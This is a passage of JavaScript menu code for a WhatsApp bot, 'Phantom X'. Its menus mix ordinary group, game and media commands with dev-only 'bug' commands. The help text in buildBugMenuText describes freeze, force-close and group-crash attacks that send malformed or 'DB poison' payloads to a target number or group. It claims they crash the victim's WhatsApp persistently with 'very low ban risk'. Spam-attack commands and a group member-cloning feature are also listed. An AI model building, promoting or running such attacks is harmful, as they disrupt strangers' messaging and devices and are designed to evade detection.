            ['.unleash allcmds ‹number› — give one number full access'],
            ['.unleash ‹cmd› all — open one cmd to everyone'],
            ['.unleash ‹cmd› ‹number› — open one cmd for one number'],
            ['.lock allcmds — re-lock everything'],
            ['.lock ‹cmd› — re-lock one cmd'],
            ['.lockfor ‹number› ‹cmd› — block cmd for number (overrides premium)'],
            ['.lockfor ‹number› allcmds — block ALL cmds for number'],
            ['.unlockfor ‹number› ‹cmd› — remove a specific block'],
            ['.premiumadd ‹number›'], ['.premiumremove ‹number›'], ['.premiumlist'],
            ['.adddev ‹number›'], ['.removedev ‹number›'], ['.devlist'],
        ]},
        { emoji: '⚠️', title: 'MODERATION', items: [
            ['.warn @user'], ['.warnlist'], ['.resetwarn @user'],
            ['.ban @user'], ['.unban @user'],
        ]},
        { emoji: '👥', title: 'GROUP MANAGEMENT', items: [
            ['.add ‹number›'], ['.kick @user'], ['.promote @user'],
            ['.demote @user'], ['.link'], ['.revoke'],
            ['.mute'], ['.unmute'], ['.groupinfo'],
            ['.adminlist'], ['.tagadmin ‹msg›'], ['.membercount'], ['.everyone ‹msg›'],
        ]},
        { emoji: '🏷️', title: 'TAG & ANNOUNCE', items: [
            ['.hidetag'], ['.tagall'], ['.readmore'],
            ['.broadcast ‹mins› ‹message›'], ['.stopbroadcast'],
            ['.schedule ‹HH:MM› ‹message›'], ['.unschedule ‹HH:MM›'], ['.schedules'],
        ]},
        { emoji: '⚙️', title: 'AUTOMATION', items: [
            ['.autoreact on/off/emoji'], ['.autoreply add/remove/list'],
            ['.setalias ‹word› ‹.cmd›'], ['.delalias ‹word›'], ['.aliases'],
            ['.antidelete on/off'], ['.antibot on/off'],
        ]},
        { emoji: '🧠', title: 'AI & MEDIA', items: [
            ['.ai ‹question›'], ['.imagine ‹prompt›'],
            ['.solve (reply to image/text question)'],
            ['.song ‹title›'], ['.lyrics ‹artist› | ‹title›'],
            ['.ss ‹url›'], ['.viewonce'], ['.ocr'],
            ['.translate ‹lang› ‹text›'], ['.weather ‹city›'],
        ]},
        { emoji: '🔍', title: 'UTILITIES', items: [
            ['.calc ‹expression›'], ['.numinfo ‹number›'], ['.targetloc ‹number›'], ['.groupid'],
            ['.listonline'], ['.listoffline'],
            ['.bible'], ['.quran'],
            ['.setstatus ‹text›'], ['.setname ‹name›'],
        ]},
        { emoji: '⚽', title: 'FOOTBALL (PL)', items: [
            ['.pltable'], ['.live'], ['.plweek'],
            ['.fixtures ‹club›'], ['.fnews ‹club›'],
            ['.football ‹club›'], ['.h2h ‹club1› vs ‹club2›'],
        ]},
        { emoji: '🎮', title: 'GAMES', items: [
            ['.ttt @p1 @p2'], ['.truth'], ['.dare'],
            ['.wordchain ‹word›'], ['.flip'], ['.dice'],
            ['.8ball ‹question›'], ['.rps rock/paper/scissors'],
            ['.slots'], ['.trivia'], ['.hangman ‹guess›'],
            ['.numguess'], ['.riddle'], ['.mathquiz'],
            ['.wouldurather'], ['.scramble'],
        ]},
        { emoji: '😂', title: 'FUN', items: [
            ['.joke'], ['.fact'], ['.quote'],
            ['.roast @user'], ['.compliment @user'],
            ['.ship @user1 @user2'], ['.rate @user'],
            ['.vibe @user'], ['.horoscope ‹sign›'],
        ]},
        { emoji: '🛡️', title: 'GROUP PROTECTION', items: [
            ['.antilink on/off'], ['.antispam on/off'],
            ['.antidemote on/off'], ['.antibug on/off/status'],
        ]},
        { emoji: '📣', title: 'NOTIFICATIONS', items: [
            ['.welcome on/off'], ['.goodbye on/off'],
        ]},
        { emoji: '🔄', title: 'GC CLONE', items: [
            ['.clone ‹src› ‹dst› ‹batch› ‹mins›'], ['.stopclone'],
        ]},
        { emoji: '🤖', title: 'ANDROID BUGS', items: [
            ['.androidbug ‹number›'], ['.crash ‹number›'],
            ['.forceclose ‹number›'], ['.fc ‹number›'],
            ['.unbug ‹number›'],
        ]},
        { emoji: '🍎', title: 'iOS BUGS', items: [
            ['.iosbug ‹number›'], ['.invisfreeze ‹number›'],
            ['.if ‹number›'], ['.crash ‹number›'],
            ['.unbug ‹number›'],
        ]},
        { emoji: '❄️', title: 'FREEZE & DELAY', items: [
            ['.freeze ‹number›'], ['.delaybug ‹number›'],
            ['.invisfreeze ‹number›'],
            ['.unbug ‹number›'],
        ]},
        { emoji: '🏘️', title: 'GROUP BUGS', items: [
            ['.groupcrash'], ['.groupcrash ‹groupId/link›'],
            ['.ungroupcrash ‹groupId›'],
        ]},
        { emoji: '🧨', title: 'EXTRA BUG TOOLS', items: [
            ['.emojibomb @user'], ['.textbomb @user ‹text› ‹times›'],
            ['.spamatk @user ‹times›'], ['.ghostping @user'],
            ['.lockedbypass ‹text›'], ['.antibug on/off/status'],
            ['.bugmenu'], ['.bugmenu android'], ['.bugmenu ios'],
            ['.bugmenu freeze'], ['.bugmenu group'],
        ]},
        { emoji: '✏️', title: 'TEXT & STYLE BUGS', items: [
            ['.zalgo ‹text›'], ['.bigtext ‹text›'],
            ['.invisible'], ['.rtl ‹text›'],
            ['.mock ‹text›'], ['.aesthetic ‹text›'],
            ['.reverse ‹text›'], ['.clap ‹text›'],
        ]},
        { emoji: '🛠️', title: 'EXTRAS', items: [
            ['.sticker'], ['.toimg'],
            ['.qr ‹text›'], ['.genpwd ‹length›'],
            ['.base64 encode/decode ‹text›'],
            ['.chat ‹message›'], ['.autojoin on/off'],
        ]},
        { emoji: '⏰', title: 'PRODUCTIVITY', items: [
            ['.remind ‹time› ‹text›'], ['.remind list / del ‹id›'],
            ['.todo / .todo add ‹task›'], ['.todo done ‹n› / del ‹n›'],
            ['.note save/get/del ‹name›'],
            ['.timer ‹time› [label]'], ['.timer list / stop ‹id›'],
            ['.countdown set ‹name› ‹YYYY-MM-DD›'], ['.countdown list / del'],
            ['.calendar [year] [month]'],
        ]},
        { emoji: '🤖', title: 'AI EXTRA', items: [
            ['.summarize (reply or text)'], ['.atranslate ‹text› ‹lang›'],
            ['.codereview (reply to code)'], ['.code ‹what to build›'],
            ['.explain ‹topic›'], ['.persona set/show/clear'],
            ['.aichat ‹message›'],
        ]},
        { emoji: '🔊', title: 'TEXT-TO-SPEECH', items: [
            ['.tts ‹text›'], ['.tts ‹lang› ‹text›'],
            ['.voice ‹text›'], ['.tovn ‹text› (voice note)'],
        ]},
        { emoji: '🖼️', title: 'IMAGE EDITOR', items: [
            ['.blur [amount]'], ['.invert'], ['.grayscale'],
            ['.brighten [factor]'], ['.darken [factor]'], ['.sharpen [sigma]'],
            ['.pixelate [amount]'], ['.cartoon'],
            ['.removebg (needs API key)'], ['.upscale (needs API key)'],
        ]},
        { emoji: '🎮', title: 'GAMES EXTRA', items: [
            ['.akinator'], ['.guessflag'], ['.math'],
            ['.typingtest'], ['.connect4'], ['.werewolf'],
        ]},
        { emoji: '📥', title: 'MEDIA DOWNLOADER', items: [
            ['.dl ‹url›'], ['.yt ‹url›'], ['.ytmp3 ‹url›'],
            ['.tiktok / .tt ‹url›'], ['.ig ‹url›'], ['.fb ‹url›'],
            ['.x ‹url›'], ['.sc ‹url›'], ['.pin ‹url›'],
            ['.reddit / .tumblr / .vimeo / .twitch'],
            ['.dlhealth (provider stats)'],
        ]},
        { emoji: '🚨', title: 'THREAT NETWORK', items: [
            ['.report ‹num› [category] [note]'],
            ['.threats (list)'], ['.threatinfo ‹num›'],
            ['.unthreat ‹num›'],
        ]},
        { emoji: '📈', title: 'PROMO ENGINE', items: [
            ['.promogroup status'], ['.promogroup setgroup ‹jid› ‹link›'],
            ['.promogroup rate ‹n› / interval ‹h›'],
            ['.promogroup on/off/pause/resume'],
            ['.promogroup pool auto/manual'],
            ['.promogroup add/remove/optout ‹num›'],
            ['.promogroup runnow / reset'],
        ]},
    ];
}

// --- T12/T13: section banners + section list helpers ---
function loadSectionBanners() { try { return JSON.parse(fs.readFileSync("menu_banners.json", "utf8")); } catch { return {}; } }
function saveSectionBanners(d) { try { fs.writeFileSync("menu_banners.json", JSON.stringify(d, null, 2)); } catch {} }
function getSectionBanner(idx) { return loadSectionBanners()[String(idx)] || null; }
function setSectionBanner(idx, b64) { const d = loadSectionBanners(); d[String(idx)] = b64; saveSectionBanners(d); }
function delSectionBanner(idx) { const d = loadSectionBanners(); delete d[String(idx)]; saveSectionBanners(d); }

// Section indices that are dev-only. By title match.
const DEV_ONLY_SECTIONS = ["DEV ACCESS CONTROL", "ANDROID BUGS", "iOS BUGS", "FREEZE & DELAY", "GROUP BUGS", "EXTRA BUG TOOLS", "TEXT & STYLE BUGS", "THREAT NETWORK", "PROMO ENGINE"];
function isDevSection(title) { return DEV_ONLY_SECTIONS.includes(title); }

function getVisibleSections(isDev) {
    const all = getMenuSections();
    return isDev ? all : all.filter(s => !isDevSection(s.title));
}

function buildSectionPicker(isDev, styleNum) {
    const sections = getVisibleSections(isDev);
    const time = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos" });
    const isStyle2 = Number(styleNum) === 2;
    if (isStyle2) {
        // Boxed/diamond style
        let out = `╔══════════════════════╗\n`;
        out += `║  💎  P H A N T O M - X  💎  ║\n`;
        out += `╚══════════════════════╝\n`;
        out += `🕓  ${time}\n`;
        out += `📚  Pick a section: *.menu <number>*\n`;
        out += `━━━━━━━━━━━━━━━━━━━\n`;
        sections.forEach((s, i) => { out += `  *${String(i + 1).padStart(2, "0")}*  ${s.emoji}  *${s.title}*\n`; });
        out += `━━━━━━━━━━━━━━━━━━━\n`;
        out += `_Tap any: e.g._  *.menu 3*\n`;
        out += `_Full menu:_  *.menu all*  •  _Style:_  *.menu style 1/2*`;
        return out;
    }
    // Style 1 — sleek minimal
    let out = `┏━━━━━━━━━━━━━━━━━━━┓\n`;
    out += `   👻  *PHANTOM-X MENU*  👻\n`;
    out += `┗━━━━━━━━━━━━━━━━━━━┛\n`;
    out += `🕓 ${time}\n\n`;
    out += `📂 *Sections* — reply *.menu <num>*\n`;
    out += `─────────────────────\n`;
    sections.forEach((s, i) => { out += `▸ *${i + 1}.* ${s.emoji} ${s.title}\n`; });
    out += `─────────────────────\n`;
    out += `_e.g._ *.menu 5*  •  *.menu all*  •  *.menu style 2*`;
    return out;
}

function buildOneSectionText(sec, idx, styleNum) {
    const isStyle2 = Number(styleNum) === 2;
    let out = isStyle2
        ? `╔══════════════════════╗\n║  ${sec.emoji}  *${sec.title}*\n╚══════════════════════╝\n`
        : `┏━━━━━━━━━━━━━━━━━━━┓\n   ${sec.emoji}  *${sec.title}*\n┗━━━━━━━━━━━━━━━━━━━┛\n`;
    sec.items.forEach(it => { out += `• ${it[0]}\n`; });
    out += `\n_Section ${idx + 1}_  •  _.menu = back to picker_`;
    return out;
}

function buildGroupMenuList() {
    return `👥 *GROUP MENU LIST*
━━━━━━━━━━━━━━━━━━━━

*Admin Actions*
• *.add <number>* — Add member
• *.kick @user* — Remove member
• *.promote @user* — Make admin
• *.demote @user* — Remove admin
• *.mute* — Admin-only messages
• *.unmute* — Open chat

*Group Info*
• *.link* — Get invite link
• *.revoke* — Reset invite link
• *.groupinfo* — Group details
• *.adminlist* — List admins
• *.membercount* — Count members
• *.groupid* — Show group ID

*Tag & Broadcast*
• *.everyone <msg>* — Tag everyone
• *.tagall* — Visible tag all
• *.hidetag* — Silent tag all
• *.broadcast <mins> <msg>* — Group broadcast
• *.stopbroadcast* — Stop broadcast

*Protection*
• *.antilink on/off*
• *.antispam on/off*
• *.antidemote on/off*
• *.antidelete on/off*
• *.antibot on/off*
• *.antibug on/off/status*

_Most group actions need the linked WhatsApp number to be admin._`;
}

function buildListMenu() {
    return `📋 *PHANTOM X LIST MENUS*
━━━━━━━━━━━━━━━━━━━━

• *.list group menu* — All group commands
• *.list bug menu* — Bug commands by section
• *.list protection menu* — Protection commands
• *.list utility menu* — Number info and utility tools
• *.list owner menu* — Owner controls
• *.list clone menu* — GC clone guide
• *.list fun menu* — Fun commands
• *.list game menu* — Game commands

You can also use:
• *.help bug menu*
• *.help group menu*
• *.bugmenu android*
• *.bugmenu ios*
• *.bugmenu group*`;
}

function buildSimpleSectionList(section) {
    const sections = {
        "protection": `🛡️ *PROTECTION MENU*
━━━━━━━━━━━━━━━━━━━━
• *.antilink on/off*
• *.antispam on/off*
• *.antidemote on/off*
• *.antidelete on/off*
• *.antibot on/off*
• *.antibug on/off/status*

*.antibug on* activates the shield on the linked bot number.`,
        "utility": `🔍 *UTILITY MENU*
━━━━━━━━━━━━━━━━━━━━
• *.numinfo <number>* — Show country/prefix info
• *.targetloc <number>* — Same as numinfo
• *.calc <expression>* — Calculator
• *.groupid* — Show group/community ID
• *.listonline* — List online members
• *.listoffline* — List offline members
• *.bible <verse>*
• *.quran <surah:ayah>*

_Number info is prefix-based only, not live GPS location._`,
        "owner": `👑 *OWNER CONTROL MENU*
━━━━━━━━━━━━━━━━━━━━
• *.restart* — Restart/reconnect the linked WhatsApp session
• *.mode public/owner*
• *.menudesign 1-20*
• *.setpp* — Set main menu banner (reply to image)
• *.setmenupic* — Set main menu banner
• *.setmenupic bug* — Set bug menu banner
• *.setmenupic owner* — Set owner menu banner
• *.delpp* — Delete main menu banner
• *.delpp bug* — Delete bug menu banner
• *.delpp owner* — Delete owner menu banner
• *.setstatus <text>*
• *.setname <name>*
• *.info*
• *.ping*`,
        "clone": `🔄 *GC CLONE MENU*
━━━━━━━━━━━━━━━━━━━━
• *.clone <source> <dest> <batch> <mins>*
• *.stopclone*

Source/Dest can be a group ID or invite link.
The bot can start this from any chat, but WhatsApp only exposes source members if the linked account can access that source group, and adding to destination requires admin access.`,
        "tag": `🏷️ *TAG MENU*
━━━━━━━━━━━━━━━━━━━━
• *.tagall <msg>* — Tag everyone visibly
• *.hidetag <msg>* — Mention everyone silently
• *.tagadmin <msg>* — Tag admins only
• *.everyone <msg>*
• *.broadcast <mins> <msg>*`,
        "fun": `😂 *FUN MENU*
━━━━━━━━━━━━━━━━━━━━
• *.joke*
• *.fact*
• *.quote*
• *.roast @user*
• *.compliment @user*
• *.ship @user1 @user2*
• *.rate @user*
• *.vibe @user*
• *.horoscope <sign>*`,
        "game": `🎮 *GAME MENU*
━━━━━━━━━━━━━━━━━━━━
• *.ttt @p1 @p2*
• *.truth*
• *.dare*
• *.wordchain <word>*
• *.flip*
• *.dice*
• *.8ball <question>*
• *.rps rock/paper/scissors*
• *.slots*
• *.trivia*
• *.hangman <guess>*
• *.numguess*
• *.riddle*
• *.mathquiz*
• *.wouldurather*
• *.scramble*`,
    };
    return sections[section] || buildListMenu();
}

function buildBugMenuText(section = "") {
    const freezeHelp = `🧊 *FREEZE BUG*
━━━━━━━━━━━━━━━━━━━━
• *.freeze <number>*
  Example: *.freeze 2348012345678*

What it does:
→ Creates a circular DB index loop (A→B→A→B) in their WA storage
→ Their WA gets stuck loading — msgs blocked in & out
→ Persists after restart — only reinstall or *.unbug* clears it
→ 3 packets with human-like timing — very low ban risk

• *.unbug <number>* — undo the freeze`;

    const fcHelp = `💀 *FORCE CLOSE BUG*
━━━━━━━━━━━━━━━━━━━━
• *.forceclose <number>*
  Shortcut: *.fc <number>*
  Example: *.forceclose 2348012345678*

What it does:
→ Sends 1 document with a malformed thumbnail binary
→ WA's image decoder crashes every time they open the chat
→ Persists until they clear WA media or reinstall
→ Silent — just looks like a PDF was sent
→ 1 message only — lowest possible ban risk

• *.unbug <number>* — undo force close`;

    const groupHelp = `💣 *GROUP CRASH*
━━━━━━━━━━━━━━━━━━━━
• *.groupcrash* — run inside the target group
• *.groupcrash <groupId>* — use group ID (from *.groupid*)
• *.groupcrash <invite link>* — paste invite link

What it does:
→ Sends 1 invisible list message with DB poison payload
→ Anyone who opens the group → WA crashes immediately
→ Works on Android & iOS — no tap needed
→ Persists across restarts until message is deleted
→ 1 message only — very low ban risk

• *.ungroupcrash <groupId>* — restore the group
• *.groupid* — get the current group ID`;

    const defenseHelp = `🛡️ *ANTI BUG DEFENSE*
━━━━━━━━━━━━━━━━━━━━
• *.antibug on* — Activate protection
• *.antibug off* — Deactivate protection
• *.antibug status* — Check current state

When active, the shield monitors every message arriving on the linked number and neutralises threats before they render.`;

    if (section === "freeze") return freezeHelp;
    if (section === "forceclose" || section === "fc") return fcHelp;
    if (section === "group" || section === "groupcrash") return groupHelp;
    if (section === "defense" || section === "protect" || section === "antibug") return defenseHelp;

    return `💥 *PHANTOM X BUG MENU*
━━━━━━━━━━━━━━━━━━━━

${freezeHelp}

${fcHelp}

${groupHelp}

${defenseHelp}

━━━━━━━━━━━━━━━━━━━━
💡 *Tips:*
• All 3 bugs have very low ban risk
• Use *.antibug on* to protect yourself
• *.groupid* — get a group's ID
• *.bugmenu freeze* / *.bugmenu forceclose* / *.bugmenu group*`;
}

// ─── THEME 1: GHOST ───
function buildThemeGhost(ml, time, up, S) {
    let o = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n   ☠️  *P H A N T O M  ✘*  ☠️\n   _The Ghost in Your Machine_ 👻\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n◈ ◈ ◈  *S Y S T E M  S T A T U S*  ◈ ◈ ◈\n\n  🤖  *Bot*     ›  Phantom X\n  📌  *Ver*     ›  v${BOT_VERSION}\n  🌐  *Mode*    ›  ${ml}\n  ⏱️  *Uptime*  ›  ${up}\n  🕐  *Time*    ›  ${time}\n`;
    for (const s of S) { o += `\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n〔 ${s.emoji} *${s.title}* 〕\n\n`; for (const [c] of s.items) o += `  ✦  *${c}*\n`; }
    return (o + `\n╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n  💀 _Phantom X — Built Different. Built Cold._ 🖤\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯`).trim();
}

// ─── THEME 2: MATRIX ───
function buildThemeMatrix(ml, time, up, S) {
    let o = `█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n█   💻  *PHANTOM_X  v${BOT_VERSION}*   💻   █\n█   _> SYSTEM ONLINE ✓_         █\n█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n\n*[ SYS_INFO ]*\n  »  *Bot*    :  Phantom X\n  »  *Mode*   :  ${ml}\n  »  *Uptime* :  ${up}\n  »  *Time*   :  ${time}\n`;
    for (const s of S) { o += `\n══════════════════════════════\n*[ MODULE :: ${s.title} ]*  ${s.emoji}\n`; for (const [c] of s.items) o += `  *>*  \`${c}\`\n`; }
    return (o + `\n══════════════════════════════\n_> PHANTOM_X — Ghost Protocol Active._ 👻`).trim();
}

// ─── THEME 3: ROYAL ───
function buildThemeRoyal(ml, time, up, S) {
    let o = `♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n         👑  *PHANTOM X*  👑\n    _ꜱɪʟᴇɴᴛ. ᴅᴇᴀᴅʟʏ. ᴅɪɢɪᴛᴀʟ._\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n\n✦ *ROYAL STATUS* ✦\n\n   ◆  *Bot*     ∷  Phantom X\n   ◆  *Version* ∷  v${BOT_VERSION}\n   ◆  *Mode*    ∷  ${ml}\n   ◆  *Uptime*  ∷  ${up}\n   ◆  *Time*    ∷  ${time}\n`;
    for (const s of S) { o += `\n═══════════════════════════════\n❖  *${s.emoji} ${s.title}*  ❖\n\n`; for (const [c] of s.items) o += `   ◆  *${c}*\n`; }
    return (o + `\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n  👑 _Phantom X — The Digital Monarch_ 🖤\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛`).trim();
}

// ─── THEME 4: INFERNO ───
function buildThemeInferno(ml, time, up, S) {
    let o = `🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n   💥  *P H A N T O M  X*  💥\n   _No Cap. No Mercy. Built Cold._ 🥶\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n\n⚡ *SYSTEM STATUS* ⚡\n\n  🔸  *Bot*     »  Phantom X\n  🔸  *Version* »  v${BOT_VERSION}\n  🔸  *Mode*    »  ${ml}\n  🔸  *Uptime*  »  ${up}\n  🔸  *Time*    »  ${time}\n`;
    for (const s of S) { o += `\n🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥\n💀 *${s.emoji} ${s.title}* 💀\n\n`; for (const [c] of s.items) o += `  ⚡  *${c}*\n`; }
    return (o + `\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n  💀 _Phantom X — Straight Savage. No Filter._ 🔥\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥`).trim();
}

// ─── THEME 5: MINIMAL ───
function buildThemeMinimal(ml, time, up, S) {
    let o = `─────────────────────────────\n   ✧  *PHANTOM X*  ·  v${BOT_VERSION}  ✧\n─────────────────────────────\n\n  Bot    ·  Phantom X\n  Mode   ·  ${ml}\n  Uptime ·  ${up}\n  Time   ·  ${time}\n`;
    for (const s of S) { o += `\n─────────────────────────────\n  *${s.emoji} ${s.title}*\n─────────────────────────────\n`; for (const [c] of s.items) o += `  ›  *${c}*\n`; }
    return (o + `\n─────────────────────────────\n  _Phantom X — Built Different_ 🖤\n─────────────────────────────`).trim();
}

// ─── THEME 6: VOID (Ultimate Hacker · Echo Protocol) ───
function buildThemeVoid(ml, time, up, S) {
    let o = `▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n\n        𝚅  𝙾  𝙸  𝙳\n   𝙿𝙷𝙰𝙽𝚃𝙾𝙼_𝚇 :: 𝙴𝙲𝙷𝙾_𝙿𝚁𝙾𝚃𝙾𝙲𝙾𝙻\n\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n\n> initializing ghost_shell...\n> loading kernel............. ✓\n> bypassing firewall......... ✓\n> identity_mask: ONLINE ✓\n> threat_level: MAXIMUM 🔴\n\n╔══════════════════════════╗\n║  *0x01*  BOT    →  𝙿𝚑𝚊𝚗𝚝𝚘𝚖 𝚇  ║\n║  *0x02*  VER    →  v${BOT_VERSION}         ║\n║  *0x03*  MODE   →  ${ml}  ║\n║  *0x04*  UPTIME →  ${up}  ║\n╚══════════════════════════╝\n`;
    let i = 0;
    for (const s of S) {
        o += `\n▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n:: ${s.emoji} ${s.title} ::\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n`;
        for (const [c] of s.items) { i++; o += `  [*${String(i).padStart(2,'0')}*]  *${c}*\n`; }
    }
    return (o + `\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n> 𝚃𝚁𝙰𝙽𝚂𝙼𝙸𝚂𝚂𝙸𝙾𝙽_𝙴𝙽𝙳 ◆ 𝙶𝙷𝙾𝚂𝚃_𝙿𝚁𝙾𝚃𝙾𝙲𝙾𝙻_𝙰𝙲𝚃𝙸𝚅𝙴\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓`).trim();
}

// ─── THEME 7: VAPORWAVE ───
function buildThemeVaporwave(ml, time, up, S) {
    let o = `░░░░░░░░░░░░░░░░░░░░░░░░░░░\n\n  Ｐ Ｈ Ａ Ｎ Ｔ Ｏ Ｍ  Ｘ\n  ａ ｅ ｓ ｔ ｈ ｅ ｔ ｉ ｃ\n\n░░░░░░░░░░░░░░░░░░░░░░░░░░░\n\n  ♡  Ｂｏｔ      ：  Ｐｈａｎｔｏｍ Ｘ\n  ♡  Ｖｅｒｓｉｏｎ  ：  ｖ${BOT_VERSION}\n  ♡  Ｍｏｄｅ     ：  ${ml}\n  ♡  Ｕｐｔｉｍｅ   ：  ${up}\n  ♡  Ｔｉｍｅ     ：  ${time}\n`;
    for (const s of S) { o += `\n▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n  ${s.emoji}  ｛  *${s.title}*  ｝\n▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n`; for (const [c] of s.items) o += `  ✦ ｜  *${c}*\n`; }
    return (o + `\n░░░░░░░░░░░░░░░░░░░░░░░░░░░\n  ｐｈａｎｔｏｍ ｘ  ♡  ｂｕｉｌｔ ｄｉｆｆｅｒｅｎｔ\n░░░░░░░░░░░░░░░░░░░░░░░░░░░`).trim();
}

// ─── THEME 8: GOTHIC ───
function buildThemeGothic(ml, time, up, S) {
    let o = `✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n\n   𝔓 𝔥 𝔞 𝔫 𝔱 𝔬 𝔪  𝔛\n  _𝔗𝔥𝔢 𝔇𝔞𝔯𝔨 𝔒𝔯𝔡𝔢𝔯 𝔄𝔴𝔞𝔨𝔢𝔫𝔰_\n\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n\n  ☩  𝔅𝔬𝔱      ∶  𝔓𝔥𝔞𝔫𝔱𝔬𝔪 𝔛\n  ☩  𝔙𝔢𝔯𝔰𝔦𝔬𝔫  ∶  ｖ${BOT_VERSION}\n  ☩  𝔐𝔬𝔡𝔢     ∶  ${ml}\n  ☩  𝔘𝔭𝔱𝔦𝔪𝔢   ∶  ${up}\n  ☩  𝔗𝔦𝔪𝔢     ∶  ${time}\n`;
    for (const s of S) { o += `\n✠═══════════════════════════✠\n  ☩  *${s.emoji} ${s.title}*\n✠═══════════════════════════✠\n`; for (const [c] of s.items) o += `  ✝  *${c}*\n`; }
    return (o + `\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n  ☩ _𝔓𝔥𝔞𝔫𝔱𝔬𝔪 𝔛 — 𝔅𝔲𝔦𝔩𝔱 𝔬𝔣 𝔇𝔞𝔯𝔨𝔫𝔢𝔰𝔰_ 🖤\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠`).trim();
}

// ─── THEME 9: CURSIVE ───
function buildThemeCursive(ml, time, up, S) {
    let o = `❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n\n   𝒫 𝒽 𝒶 𝓃 𝓉 ℴ 𝓂  𝒳\n  _𝒢𝒽ℴ𝓈𝓉 𝒾𝓃 𝓉𝒽ℯ 𝒮𝒽ℯ𝓁𝓁_ ✨\n\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n\n  ❧  𝐵ℴ𝓉      ·  𝒫𝒽𝒶𝓃𝓉ℴ𝓂 𝒳\n  ❧  𝒱ℯ𝓇𝓈𝒾ℴ𝓃  ·  v${BOT_VERSION}\n  ❧  𝑀ℴ𝒹ℯ     ·  ${ml}\n  ❧  𝒰𝓅𝓉𝒾𝓂ℯ   ·  ${up}\n  ❧  𝒯𝒾𝓂ℯ     ·  ${time}\n`;
    for (const s of S) { o += `\n❦───────────────────────────❦\n  ❧ *${s.emoji} ${s.title}*\n❦───────────────────────────❦\n`; for (const [c] of s.items) o += `  ❧  *${c}*\n`; }
    return (o + `\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n  ❧ _𝒫𝒽𝒶𝓃𝓉ℴ𝓂 𝒳 — 𝐵𝓊𝒾𝓁𝓉 𝒟𝒾𝒻𝒻ℯ𝓇ℯ𝓃𝓉_ 🖤\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦`).trim();
}

// ─── THEME 10: COSMOS ───
function buildThemeCosmos(ml, time, up, S) {
    let o = `🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n\n   🛸  *P H A N T O M  X*  🛸\n   _Drifting Through the Digital Void_\n\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n\n  🌟  *Bot*     ⟶  Phantom X\n  🪐  *Version* ⟶  v${BOT_VERSION}\n  🛰️  *Mode*    ⟶  ${ml}\n  ☄️  *Uptime*  ⟶  ${up}\n  🌙  *Time*    ⟶  ${time}\n`;
    for (const s of S) { o += `\n✦━━━━━━━━━━━━━━━━━━━━━━━━━━✦\n🌌 *${s.emoji} ${s.title}* 🌌\n✦━━━━━━━━━━━━━━━━━━━━━━━━━━✦\n`; for (const [c] of s.items) o += `  🌠  *${c}*\n`; }
    return (o + `\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n  🛸 _Phantom X — Lost in the Stars_ ✨\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌`).trim();
}

// ─── THEME 11: SOFT ───
function buildThemeSoft(ml, time, up, S) {
    let o = `˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n\n   ℙ ℍ 𝔸 ℕ 𝕋 𝕆 𝕄  𝕏\n  _ꜱᴏꜰᴛ. ꜱɪʟᴇɴᴛ. ᴅᴇᴀᴅʟʏ._ 🌸\n\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n\n  ˚✦  *ᴮᵒᵗ*       ⌇  Phantom X\n  ˚✦  *ᵛᵉʳˢⁱᵒⁿ*   ⌇  v${BOT_VERSION}\n  ˚✦  *ᴹᵒᵈᵉ*      ⌇  ${ml}\n  ˚✦  *ᵁᵖᵗⁱᵐᵉ*    ⌇  ${up}\n  ˚✦  *ᵀⁱᵐᵉ*      ⌇  ${time}\n`;
    for (const s of S) { o += `\n˚ · . ꒰ ${s.emoji} *${s.title}* ꒱ . · ˚\n`; for (const [c] of s.items) o += `  ♡  *${c}*\n`; }
